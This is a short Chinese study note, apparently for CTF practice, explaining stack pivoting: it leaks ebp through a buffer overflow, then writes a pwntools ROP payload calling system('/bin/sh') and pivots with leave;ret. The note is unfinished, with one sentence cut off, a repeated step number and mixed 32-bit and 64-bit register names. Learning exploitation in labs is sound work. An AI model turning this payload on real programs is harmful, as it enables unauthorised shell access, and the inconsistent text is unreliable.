## 栈迁移任意地址写
![[Pasted image 20240206140535.png]]


第一步：找到我们的栈迁移的目标地址。
这一步，我们需要通过我们的 `printf` 函数来执行我们的格式化字符串漏洞。也可以考虑通过我们的 vmmap 来进行

```
sa(b'name?\n', b'a'*0x28)
ebp = u32(p.recvuntil(b'\xff')[-4:])
```

第二步：在我们的栈迁移目标地址写入我们的 ROP 链。
```
payload = b'aaaa' + p32(elf.sym['system']) + p32(0) + p32(ebp - 0x28) + b'/bin/sh\x00'
```

第三步，通过我们的栈迁移移动我们的 rbp 和我们的对应执行：
```
payload=payload.ljust(0x28,b'\x00')+p32(ebp-0x38)+p32(leave_ret)
```

其中，我们的 `ebp-0x38` 是我们的

第三步：有些时候我们可能不能成功的获取，这里的原因可能是我们的 rsp 指向的地址不可写，这个时候，我们的可行的操作之一，就是在我们的 `pr6(rdi)` 之前添加若干个我们的 `ret` 指令，从而达到我们的效果。